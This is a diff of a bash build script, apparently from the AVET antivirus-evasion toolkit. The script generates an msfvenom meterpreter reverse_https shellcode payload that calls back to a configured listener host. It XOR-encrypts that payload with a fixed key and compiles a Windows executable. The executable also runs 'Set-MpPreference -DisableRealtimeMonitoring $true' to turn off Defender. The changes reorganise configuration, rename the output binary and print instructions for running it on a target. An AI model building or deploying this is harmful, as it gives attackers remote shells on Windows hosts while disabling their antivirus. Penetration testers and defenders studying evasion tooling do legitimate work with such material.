@@ -1,9 +1,11 @@
-#!/bin/bash    
+#!/bin/bash
+
+
+#DESCRIPTION_START
 # Execute 64-bit shellcode.
 # Encrypts the payload with a dynamic XOR key, which needs to be provided via command line argument 2 to decrypt.
 # Attempts to disable Windows Defender's real-time protection via Powershell command "Set-MpPreference -DisableRealtimeMonitoring $true".
-#
-# Call on target like:  output.exe first aabbccddee
+#DESCRIPTION_END
 
 
 # print AVET logo
@@ -20,9 +22,17 @@ cat banner.txt
 # import global default lhost and lport values from build/global_connect_config.sh
 . build/global_connect_config.sh
 
+
+#CONFIGURATION_START
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# generate key file
+generate_key preset aabbccddee input/key_raw.txt
+# enable debug output
+enable_debug_print
+#CONFIGURATION_END
+
 
 # make meterpreter reverse payload
 msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt
@@ -31,8 +41,7 @@ msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x
 set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring $true'
 set_command_exec exec_via_powershell
 
-# generate key file
-generate_key preset aabbccddee input/key_raw.txt
+
 
 # encrypt payload
 encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt
@@ -54,12 +63,15 @@ set_payload_info_source no_data
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode64
 
-# enable debug output
-enable_debug_print
-
 # call make_avet, compile 
-$win64_compiler -o output/output.exe source/avet.c
-strip output/output.exe
+$win64_compiler -o output/disablewindefpsh_xorfromcmd_revhttps_win64.exe source/avet.c
+strip output/disablewindefpsh_xorfromcmd_revhttps_win64.exe
 
 # cleanup
 cleanup_techniques
+
+echo "
+# The decryption key is aabbccddee if it has not been changed.
+# Call on target like:
+# disablewindefpsh_xorfromcmd_revhttps_win64.exe first [decryption key]
+"
